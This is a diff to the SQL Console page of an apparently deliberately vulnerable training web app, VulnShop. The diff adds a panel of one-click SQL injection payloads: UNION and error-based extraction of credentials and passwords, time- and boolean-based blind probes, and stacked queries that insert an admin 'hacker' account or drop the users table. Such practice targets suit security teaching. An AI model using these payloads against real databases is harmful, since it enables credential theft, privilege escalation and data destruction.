@@ -3,45 +3,112 @@
 <html lang="en">
 <head><meta charset="utf-8" /><title>SQL Console</title><meta name="viewport" content="width=device-width, initial-scale=1" /><link rel="stylesheet" href="../assets/css/admin.css" /></head>
 <body>
-  <header class="topbar">
-    <div class="brand">VulnShop</div>
-    <nav>
-      <a href="index.html">Home</a>
-      <button id="theme-toggle" class="theme-toggle" aria-label="Toggle theme">🌙</button>
-    </nav>
-  </header>
-
   <aside class="sidebar">
     <div class="logo">Admin</div>
     <nav>
       <a href="index.html">Dashboard</a>
       <a href="sql_console.html" class="active">SQL Console</a>
       <a href="config.html">Config</a>
-          <button id="theme-toggle" class="theme-toggle" aria-label="Toggle theme">🌙</button>
+      <button id="theme-toggle" class="theme-toggle" aria-label="Toggle theme" style="margin-top: 16px; width: 100%;">🌙</button>
     </nav>
   </aside>
   <main class="content">
     <h1>SQL Console</h1>
     <p class="muted">Execute SQL queries directly on the database. Supports UNION, subqueries, and advanced SQL features.</p>
+    
     <form id="sql-form">
-      <textarea name="sql" rows="8" placeholder="SELECT * FROM users LIMIT 2;"></textarea>
-      <button>Run</button>
+      <textarea name="sql" rows="10" placeholder="SELECT * FROM users LIMIT 2;" style="font-family: 'Monaco', 'Menlo', monospace;"></textarea>
+      <button type="submit" class="btn">Execute Query</button>
     </form>
-    <pre id="sql-output" class="mt"></pre>
-    <div class="mt">
-      <h3>Vulnerability: SQL Injection (Multiple Types)</h3>
-      <p>This console is vulnerable to SQL injection. Try:</p>
-      <ul>
-        <li><code>1' UNION SELECT username, password, email FROM users--</code></li>
-        <li><code>1' OR '1'='1</code></li>
-        <li><code>1'; DROP TABLE users;--</code></li>
-        <li><code>1' AND (SELECT SUBSTRING(@@version,1,1))='5'--</code> (Error-based)</li>
-        <li><code>1' AND SLEEP(5)--</code> (Time-based blind)</li>
-      </ul>
+    
+    <div id="sql-output-container" class="mt">
+      <pre id="sql-output" style="min-height: 100px; background: var(--bg-secondary); padding: 16px; border-radius: 6px; border: 1px solid var(--border);"></pre>
     </div>
+    
+    <div class="card mt-2">
+      <h2>Advanced SQL Injection Examples</h2>
+      
+      <div class="mt">
+        <h3>1. UNION-based SQL Injection</h3>
+        <p class="muted">Extract data from other tables:</p>
+        <div style="display: grid; gap: 8px;">
+          <button class="btn outline" onclick="setQuery(`1' UNION SELECT username, password, email, role FROM users--`)">Extract User Credentials</button>
+          <button class="btn outline" onclick="setQuery(`1' UNION SELECT @@version, database(), user(), NULL--`)">Get Database Info</button>
+          <button class="btn outline" onclick="setQuery(`1' UNION SELECT table_name, NULL, NULL, NULL FROM information_schema.tables--`)">List Tables</button>
+        </div>
+      </div>
+      
+      <div class="mt">
+        <h3>2. Error-based SQL Injection</h3>
+        <p class="muted">Extract data through error messages:</p>
+        <div style="display: grid; gap: 8px;">
+          <button class="btn outline" onclick="setQuery(`1' AND extractvalue(1, concat(0x7e, (SELECT password FROM users WHERE id=1), 0x7e))--`)">Extract Password via Error</button>
+          <button class="btn outline" onclick="setQuery(`1' AND updatexml(1, concat(0x7e, (SELECT @@version), 0x7e), 1)--`)">Get Version via Error</button>
+        </div>
+      </div>
+      
+      <div class="mt">
+        <h3>3. Time-based Blind SQL Injection</h3>
+        <p class="muted">Detect vulnerabilities through delays:</p>
+        <div style="display: grid; gap: 8px;">
+          <button class="btn outline" onclick="setQuery(`1' AND SLEEP(5)--`)">Test Time Delay</button>
+          <button class="btn outline" onclick="setQuery(`1' AND IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0)--`)">Conditional Delay</button>
+        </div>
+      </div>
+      
+      <div class="mt">
+        <h3>4. Boolean-based Blind SQL Injection</h3>
+        <p class="muted">Extract data through true/false conditions:</p>
+        <div style="display: grid; gap: 8px;">
+          <button class="btn outline" onclick="setQuery(`1' OR '1'='1`)">Always True Condition</button>
+          <button class="btn outline" onclick="setQuery(`1' OR '1'='2`)">Always False Condition</button>
+          <button class="btn outline" onclick="setQuery(`1' AND (SELECT SUBSTRING(@@version,1,1))='8'--`)">Version Check</button>
+        </div>
+      </div>
+      
+      <div class="mt">
+        <h3>5. Stacked Queries</h3>
+        <p class="muted">Execute multiple statements:</p>
+        <div style="display: grid; gap: 8px;">
+          <button class="btn outline" onclick="setQuery(`1'; INSERT INTO users (username, password) VALUES ('hacker', 'pwned');--`)">Insert Data</button>
+          <button class="btn outline" onclick="setQuery(`1'; UPDATE users SET role='admin' WHERE username='hacker';--`)">Update Data</button>
+          <button class="btn outline" onclick="setQuery(`1'; DROP TABLE users;--`)">Drop Table (Blocked)</button>
+        </div>
+      </div>
+      
+      <div class="mt">
+        <h3>Quick Reference</h3>
+        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 12px;">
+          <div class="card" style="padding: 12px;">
+            <strong>Extract Users:</strong>
+            <pre style="font-size: 0.75rem; margin-top: 8px;"><code>1' UNION SELECT username, password, email FROM users--</code></pre>
+          </div>
+          <div class="card" style="padding: 12px;">
+            <strong>Get Version:</strong>
+            <pre style="font-size: 0.75rem; margin-top: 8px;"><code>1' UNION SELECT @@version, NULL, NULL--</code></pre>
+          </div>
+          <div class="card" style="padding: 12px;">
+            <strong>List Tables:</strong>
+            <pre style="font-size: 0.75rem; margin-top: 8px;"><code>1' UNION SELECT table_name FROM information_schema.tables--</code></pre>
+          </div>
+          <div class="card" style="padding: 12px;">
+            <strong>Time Delay:</strong>
+            <pre style="font-size: 0.75rem; margin-top: 8px;"><code>1' AND SLEEP(5)--</code></pre>
+          </div>
+        </div>
+      </div>
+    </div>
+    
+    <script>
+      function setQuery(sql) {
+        document.querySelector('textarea[name="sql"]').value = sql;
+        document.querySelector('textarea[name="sql"]').focus();
+      }
+    </script>
   </main>
+  <script src="../assets/js/theme.js"></script>
+  <script src="../assets/js/vulnerabilities.js"></script>
   <script src="../assets/js/logger.js"></script>
   <script src="../assets/js/app.js"></script>
-  <script src="assets/js/theme.js"></script>
 </body>
 </html>
